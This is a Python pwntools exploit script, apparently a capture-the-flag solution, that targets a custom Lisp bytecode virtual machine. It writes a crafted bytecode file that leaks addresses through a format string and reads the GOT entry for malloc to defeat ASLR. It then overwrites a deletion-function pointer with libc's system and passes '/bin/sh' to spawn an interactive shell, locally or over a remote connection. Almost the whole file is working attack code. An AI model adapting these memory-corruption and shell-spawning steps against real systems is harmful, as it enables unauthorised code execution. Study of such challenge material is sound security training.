#!/usr/bin/env python3

from pwn import *
import struct

context.arch = 'amd64'
context.terminal = ['alacritty', '-e']

try:
    binary = ELF("../lvm/backend/lisp")
except:
    pass
libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6")

STRING = p16(0x51)
CONS = p16(0x52)
NUMBER = p16(0x53)
NIL = p16(0x54)
T = p16(0x55)

CAR = p16(0x14)
CDR = p16(0x15)

MAKE_CONS = p16(0x72)

def RET(x):
    return p16(0x7 | (x << 8))
def SETF(x):
    return p16(0x1c | (x << 8))

def POP(x):
    return p16(0x75 | (x << 8))

def DUP(x):
    return p16(0x74 | (x << 8))

def FORMAT(x):
    return p16(0x1f | (x << 8))

ID = p16(0x21)
PRINT = p16(0x22)
READ = p16(0x23)

LEAKNIL = NIL + ID + STRING + p16(0) + FORMAT(1) + PRINT + POP(1)
LEAKADDR = STRING + p16(0) + DUP(0) + READ + SETF(0) + POP(2) + PRINT + POP(1)
WRITE = NIL + T + CONS + DUP(0) + READ + SETF(0) + POP(2) + CAR + READ + SETF(0) + POP(2)

code = STRING + p16(3) + LEAKNIL + LEAKADDR + WRITE + RET(0)
constants = b"%x\x00/bin/sh\x00"

header = b"\x01LSP" + p16(len(code) // 2) + p16(len(constants)) + p64(0x10)

with open('exploit.lispc', 'wb') as f:
    f.write(header + code + constants)


def doublify(target):
    return f'{struct.unpack("d", p64(target))[0]:.1000}'.encode()


if args.GDB:
    p = gdb.debug(["../lvm/backend/lisp", "exploit.lispc"])
elif args.REMOTE:
    p = remote('localhost', 7778)
    p.sendline(b'foo')
    p.sendline(b'bar')
    p.sendline(b'exploit.lispc')
    p.recvuntil('File to run: ')
    subprocess.run(['wget', '-O', '/tmp/lisp', 'http://[::1]:7777/static/download/lisp'])
    libc = ELF("libc-musl.so")
    binary = ELF("/tmp/lisp")
else:
    p = process(["../lvm/backend/lisp", "exploit.lispc"])

leak = int(p.recvlineS()[:-1], 16)
binary.address = leak - binary.symbols['nil']

log.info(f'Binary @ 0x{binary.address:x}')
p.sendline(doublify(binary.got['malloc']))
leak = u64(p.recvline()[:-1].ljust(8, b'\x00'))

libc.address = leak - libc.sym['malloc']
log.info(f'libc @ 0x{libc.address:x}')

TYPE_STRING = (1 << 3)
p.sendline(doublify(binary.symbols['deletion_function'] + TYPE_STRING * 8 - 8))
p.sendline(doublify(libc.symbols['system']))

p.interactive()
